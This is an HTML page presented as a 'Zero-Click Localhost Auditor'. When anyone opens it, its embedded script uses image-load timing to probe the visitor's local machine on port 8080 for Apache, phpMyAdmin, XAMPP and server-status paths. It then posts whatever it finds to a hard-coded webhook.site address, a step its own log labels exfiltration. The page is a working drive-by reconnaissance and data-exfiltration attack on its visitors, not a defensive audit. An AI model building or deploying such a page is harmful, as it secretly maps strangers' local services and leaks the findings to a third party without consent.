<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Zero-Click Localhost Auditor</title>
    <style>
        :root { --glow: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--glow); font-family: 'Consolas', monospace; padding: 40px; }
        .terminal { background: #000; border: 1px solid var(--glow); height: 500px; overflow-y: auto; padding: 20px; box-shadow: 0 0 20px rgba(0,255,65,0.2); border-radius: 10px; }
        .found { color: #fff; background: rgba(0, 255, 65, 0.4); font-weight: bold; border-left: 4px solid #fff; padding-left: 10px; margin: 5px 0; }
        .status-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid var(--glow); padding-bottom: 10px; }
    </style>
</head>
<body>

    <div class="status-header">
        <h1>Firefox Zero-Click Recon Auditor</h1>
        <p style="color: #888;">Status: <span id="status">Scanning...</span></p>
    </div>

    <div id="log" class="terminal">> Initializing auto-scan module...</div>

<script>
    const WEBHOOK = "https://webhook.site/e0f55d82-ffe9-4c83-831f-8ff45612a506";
    const logBox = document.getElementById('log');
    const statusText = document.getElementById('status');

    function print(msg, isFound = false) {
        const div = document.createElement('div');
        if (isFound) div.className = 'found';
        div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.appendChild(div);
        logBox.scrollTop = logBox.scrollHeight;
    }

    async function checkAsset(path) {
        return new Promise((resolve) => {
            const img = new Image();
            const start = performance.now();
            
            img.onload = () => resolve(performance.now() - start);
            img.onerror = () => resolve(performance.now() - start);
            
            img.src = `http://127.0.0.1:8080${path}?nocache=${Math.random()}`;
            setTimeout(() => resolve(1000), 1000);
        });
    }

    // Window load hote hi function trigger hoga
    window.onload = async function() {
        print("Page Loaded. Starting Zero-Click Audit on 127.0.0.1:8080...");
        
        // Step 1: Baseline for 404 (Not Found)
        const baseline = await checkAsset("/non_existent_path_" + Math.random());
        print(`Baseline (404) Response: ${baseline.toFixed(2)}ms`);

        const targets = [
            { name: "Apache Sign", path: "/icons/apache_pb.png" },
            { name: "PHPMyAdmin", path: "/phpmyadmin/index.php" },
            { name: "XAMPP Dashboard", path: "/dashboard/images/xampp-logo.svg" },
            { name: "Server Status", path: "/server-status" }
        ];

        let results = [];

        for (let t of targets) {
            print(`Probing ${t.name}...`);
            const time = await checkAsset(t.path);
            
            // Logic: Agar timing baseline se significantly alag hai, toh asset wahan hai
            if (time < baseline * 0.8 || time < 35) {
                print(`CONFIRMED: ${t.name} (Verified in ${time.toFixed(2)}ms)`, true);
                results.push({ asset: t.name, path: t.path, response_time: time });
            }
        }

        if (results.length > 0) {
            print("Audit Complete. Exfiltrating intelligence...");
            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(results) });
            print("DATA SENT TO WEBHOOK.", true);
            statusText.innerText = "Complete - Assets Discovered";
        } else {
            print("No local services confirmed.");
            statusText.innerText = "Complete - No Assets Found";
        }
    };
</script>
</body>
</html>
